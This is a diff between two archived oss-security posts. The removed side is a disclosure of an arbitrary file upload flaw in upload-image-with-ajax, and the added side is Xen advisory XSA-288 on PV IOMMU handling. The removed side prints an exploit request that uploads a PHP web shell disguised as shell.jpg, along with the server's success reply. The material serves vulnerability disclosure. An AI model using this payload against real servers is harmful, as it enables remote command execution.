@@ -1,68 +1,148 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2019/12/23/1
-Message-ID: <E98B12D6-2DD9-43AA-A854-DD45B36AC5C5@me.com>
-Date: Mon, 23 Dec 2019 12:09:16 -0500
-From: "Larry W. Cashdollar" <larry0@...com>
-To: Open Security <oss-security@...ts.openwall.com>
-Subject: Arbitrary file upload vulnerability in upload-image-with-ajax v1.0
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2019/03/05/6
+Message-Id: <E1h195O-0002lU-Jo@xenbits.xenproject.org>
+Date: Tue, 05 Mar 2019 12:22:18 +0000
+From: Xen.org security team <security@....org>
+To: xen-announce@...ts.xen.org, xen-devel@...ts.xen.org, xen-users@...ts.xen.org, oss-security@...ts.openwall.com
+CC: Xen.org security team <security-team-members@....org>
+Subject: Xen Security Advisory 288 v2 - x86: Inconsistent PV IOMMU discipline
 Content-Type: text/plain; charset=utf-8
 
-Title: Arbitrary file upload vulnerability in upload-image-with-ajax
-Author: Larry W. Cashdollar
-Date: 2019-12-16
-CVE-ID:[CVE-2019-8292]
-Download Site: https://github.com/abcprintf/upload-image-with-ajax/
-Vendor: adcprintf
-Vendor Notified: 2019-12-16
-Vendor Contact: wh.cprintf@...il.com
-Advisory: http://www.vapidlabs.com/advisory.php?v=211
-Description: upload-image-with-ajax
-Vulnerability:
-The code below changes the $ready flag to true if the file conforms to the size of < 1000000. Reversing the check that the file is an image. So, a .php file can be uploaded with only a warning allowing code execution.
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
 
-$ready = false;
-if((($imageType == "image/jpeg") || ($imageType == "image/jpg") || ($imageType == "image/png"))&&in_array($fileExt, $validext)){
-$ready = true;
-}else{
-echo "was not an image
-";
-/You should abort the upload right here/
-}
-if($_FILES["fileUpload"]["size"] < 1000000){
-$ready = true;
-echo "file size is ".$_FILES['fileUpload']["size"]."
-";
-}else{
-echo "file was TOO BIG!";
-}
+                    Xen Security Advisory XSA-288
+                              version 2
 
-Exploit Code:
- $ ./fileupload_exploit 192.168.0.3 80 /upload-image-with-ajax/upload.php
-POST request size is 469 bytes
- 
-Sending Payload:
-POST //upload-image-with-ajax/upload.php HTTP/1.1
-Host: 192.168.0.3
-User-Agent: File Upload Exploiter/v1.2
-Accept: */*
-Content-Length: 237
-Content-Type: multipart/form-data; boundary=------------------------c8e05c8871143853
- 
---------------------------c8e05c8871143853
-Content-Disposition: form-data; name="fileUpload"; filename="shell.jpg"
-Content-Type: image/jpeg
- 
-<?php $cmd=$_GET['cmd']; system($cmd);?>
- 
---------------------------c8e05c8871143853--
- 
-HTTP/1.1 200 OK
-Date: Mon, 16 Dec 2019 04:39:56 GMT
-Server: Apache/2.4.25 (Debian)
-Content-Length: 37
-Content-Type: text/html; charset=UTF-8
- 
-file size is 42<br>upload successful!
-[+] Total bytes read: 185
+                 x86: Inconsistent PV IOMMU discipline
+
+UPDATES IN VERSION 2
+====================
+
+Metadata updated to remove dependency on XSA-283.
+
+4.7 backport updated to fix a debug build failure.
+
+Public release.
+
+ISSUE DESCRIPTION
+=================
+
+In order for a PV domain to set up DMA from a passed-through device to
+one of its pages, the page must be mapped in the IOMMU.  On the other
+hand, before a PV page may be used as a "special" page type (such as a
+pagetable or descriptor table), it _must not_ be writable in the IOMMU
+(otherwise a malicious guest could DMA arbitrary page tables into the
+memory, bypassing Xen's safety checks); and Xen's current rule is to
+have such pages not in the IOMMU at all.
+
+Until now, in order to accomplish this, the code has borrowed HVM
+domain's "physmap" concept: When a page is assigned to a guest,
+guess_physmap_add_entry() is called, which for PV guests, will create
+a writable IOMMU mapping; and when a page is removed,
+guest_physmap_remove_entry() is called, which will remove the mapping.
+
+Additionally, when a page gains the PGT_writable page type, the page
+will be added into the IOMMU; and when the page changes away from a
+PGT_writable type, the page will be removed from the IOMMU.
+
+Unfortunately, borrowing the "physmap" concept from HVM domains is
+problematic.  HVM domains have a lock on their p2m tables, ensuring
+synchronization between modifications to the p2m; and all hypercall
+parameters must first be translated through the p2m before being used.
+Trying to mix this locked-and-gated approach with PV's lock-free
+approach leads to several races and inconsistencies.
+
+IMPACT
+======
+
+An untrusted PV domain with access to a physical device can DMA into
+its own pagetables, leading to privilege escalation.
+
+VULNERABLE SYSTEMS
+==================
+
+Only x86 systems are vulnerable.  ARM systems are not vulnerable.
+
+Only systems where PV guests are given direct access to physical
+devices (PCI pass-through) are vulnerable.  Systems with only HVM
+guests, or systems which do not use PCI pass-through, are not
+vulnerable.
+
+MITIGATION
+==========
+
+Only assigning devices to HVM guests will avoid these vulnerabilities.
+
+CREDITS
+=======
+
+This issue was discovered by Paul Durrant of Citrix.
+
+RESOLUTION
+==========
+
+Applying the appropriate attached patch resolves this issue.
+
+xsa288.patch           xen-unstable
+xsa288-4.11.patch      Xen 4.11.x, Xen 4.10.x
+xsa288-4.9.patch       Xen 4.9.x
+xsa288-4.8.patch       Xen 4.8.x
+xsa288-4.7.patch       Xen 4.7.x
+
+$ sha256sum xsa288*
+7254f0ce791b5543aec68643ec47e2bcf7823650949c7eb32db5122591f12e8c  xsa288.meta
+e1159cb5c1c5a01b28753739b6a78b555ebe4b920cae766db47e0f2a1a21c188  xsa288.patch
+e9986ceda84e7391c27d80fd541a0e5edf1eadef302a560b4e445ca9bad4c56e  xsa288-4.7.patch
+14856543ccaa5b3db2a209d25637ed025f2eb940294d0cd07e03f56630a9e5af  xsa288-4.8.patch
+df5e4a367f58491d54c778e2997142792c881d4f7b5a2a1d3339d2a3f1abafe5  xsa288-4.9.patch
+58ba46b4814695dc34beaa5fb644931253bd0b0c6a8dc843c735beec152ae722  xsa288-4.11.patch
+$
+
+DEPLOYMENT DURING EMBARGO
+=========================
+
+Deployment of the patches and/or mitigations described above (or
+others which are substantially similar) is permitted during the
+embargo, even on public-facing systems with untrusted guest users and
+administrators.
+
+But: Distribution of updated software is prohibited (except to other
+members of the predisclosure list).
+
+Predisclosure list members who wish to deploy significantly different
+patches and/or mitigations, please contact the Xen Project Security
+Team.
 
 
+(Note: this during-embargo deployment notice is retained in
+post-embargo publicly released Xen Project advisories, even though it
+is then no longer applicable.  This is to enable the community to have
+oversight of the Xen Project Security Team's decisionmaking.)
+
+For more information about permissible uses of embargoed information,
+consult the Xen Project community's agreed Security Policy:
+  http://www.xenproject.org/security-policy.html
+-----BEGIN PGP SIGNATURE-----
+
+iQFABAEBCAAqFiEEI+MiLBRfRHX6gGCng/4UyVfoK9kFAlx+aa4MHHBncEB4ZW4u
+b3JnAAoJEIP+FMlX6CvZZcYIAKeJomA0DWjp8LewxvGSUugZ34CCoS2OaOVSBw0g
+r5gGZ1B3WF8JHcpoV3JdPsiv0O61Ye2XX/PhAfe577PW5357vnNHqE9GbOVwxXNZ
+pNsSJ5r7OG1OEQdGUetB9McqkDhX/kpg4tnAokeU7FKjwfMTqjGYmacjAWlAqGqp
+mZF83H2NLiXtroq7sWcTopO32O/dvUmd0+29mcTihS+XzdeTBfNuz4XiYF9YqA04
+QN0NcqHACjM7C1OGAgXW9PXUPJzm5PuMCAR56qLxaN1V+JEC+hwkPliDpZUU2xrx
+I6mc0FkoKfIRvD8sVLB+z0rkjpnOPjVhH6okIBBcHya71fg=
+=JG+V
+-----END PGP SIGNATURE-----
+
+Download attachment "xsa288.meta" of type "application/octet-stream" (1924 bytes)
+
+Download attachment "xsa288.patch" of type "application/octet-stream" (11688 bytes)
+
+Download attachment "xsa288-4.7.patch" of type "application/octet-stream" (11857 bytes)
+
+Download attachment "xsa288-4.8.patch" of type "application/octet-stream" (12251 bytes)
+
+Download attachment "xsa288-4.9.patch" of type "application/octet-stream" (12226 bytes)
+
+Download attachment "xsa288-4.11.patch" of type "application/octet-stream" (12244 bytes)
